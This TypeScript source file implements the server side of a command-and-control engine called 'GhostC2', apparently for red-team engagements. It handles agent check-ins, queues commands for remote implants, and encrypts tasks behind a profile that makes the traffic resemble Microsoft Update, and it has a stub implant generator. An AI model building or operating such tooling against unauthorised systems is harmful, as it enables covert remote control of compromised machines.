import { eq, and, desc } from "drizzle-orm";
import { getDb } from "../db";
import {
  ghostC2Agents,
  ghostC2Tasks,
  ghostC2Channels,
} from "../../drizzle/schema";
import crypto from "node:crypto";
import { encrypt } from "./crypto";
import { MalleableEngine, MicrosoftUpdateProfile } from "./malleableC2";

export class GhostC2Engine {
  private static SESSION_KEYS = new Map<string, string>();

  static async establishSession(agentId: string, publicKey: string) {
    const sessionKey = crypto.randomBytes(32).toString("hex");
    this.SESSION_KEYS.set(agentId, sessionKey);
    return sessionKey;
  }

  static async checkIn(agentData: {
    agentId: string;
    engagementId: number;
    channelId: number;
    hostname?: string;
    os?: string;
    ipAddress?: string;
    fingerprint?: string;
  }) {
    const db = await getDb();
    if (!db) throw new Error("Database unavailable");

    const [existingAgent] = await db
      .select()
      .from(ghostC2Agents)
      .where(eq(ghostC2Agents.agentId, agentData.agentId))
      .limit(1);

    if (existingAgent) {
      await db
        .update(ghostC2Agents)
        .set({
          lastSeen: new Date(),
          status: "alive",
          ipAddress: agentData.ipAddress || existingAgent.ipAddress,
        })
        .where(eq(ghostC2Agents.agentId, agentData.agentId));
    } else {
      await db.insert(ghostC2Agents).values({
        ...agentData,
        status: "alive",
        lastSeen: new Date(),
      });
    }

    const pendingTasks = await db
      .select()
      .from(ghostC2Tasks)
      .where(
        and(
          eq(ghostC2Tasks.agentId, agentData.agentId),
          eq(ghostC2Tasks.status, "pending"),
        ),
      )
      .orderBy(desc(ghostC2Tasks.createdAt));

    const sessionKey = this.SESSION_KEYS.get(agentData.agentId);

    const securedTasks = pendingTasks.map((task) => {
      const payload = JSON.stringify({
        id: task.id,
        cmd: task.command,
        args: task.args,
      });

      const encrypted = sessionKey ? encrypt(payload, sessionKey) : payload;
      return MalleableEngine.transformResponse(
        encrypted,
        MicrosoftUpdateProfile,
      );
    });

    for (const task of pendingTasks) {
      await db
        .update(ghostC2Tasks)
        .set({ status: "sent", sentAt: new Date() })
        .where(eq(ghostC2Tasks.id, task.id));
    }

    return securedTasks;
  }

  static async submitResult(
    agentId: string,
    taskId: number,
    result: string,
    success: boolean,
  ) {
    const db = await getDb();
    if (!db) throw new Error("Database unavailable");

    await db
      .update(ghostC2Tasks)
      .set({
        result,
        status: success ? "completed" : "failed",
        completedAt: new Date(),
      })
      .where(
        and(eq(ghostC2Tasks.id, taskId), eq(ghostC2Tasks.agentId, agentId)),
      );

    return { success: true };
  }

  static async queueTask(agentId: string, command: string, args: any = {}) {
    const db = await getDb();
    if (!db) throw new Error("Database unavailable");

    const [agent] = await db
      .select()
      .from(ghostC2Agents)
      .where(eq(ghostC2Agents.agentId, agentId))
      .limit(1);

    if (!agent) throw new Error("Agent not found");

    const [newTask] = await db.insert(ghostC2Tasks).values({
      agentId,
      command,
      args: JSON.stringify(args),
      status: "pending",
    });

    return { taskId: newTask.insertId };
  }

  static generateImplant(channelId: number, os: "windows" | "linux") {
    const agentId = crypto.randomBytes(16).toString("hex");
    return {
      agentId,
      channelId,
      os,
      compiledAt: new Date().toISOString(),
      signature: crypto.randomBytes(32).toString("base64"),
    };
  }
}
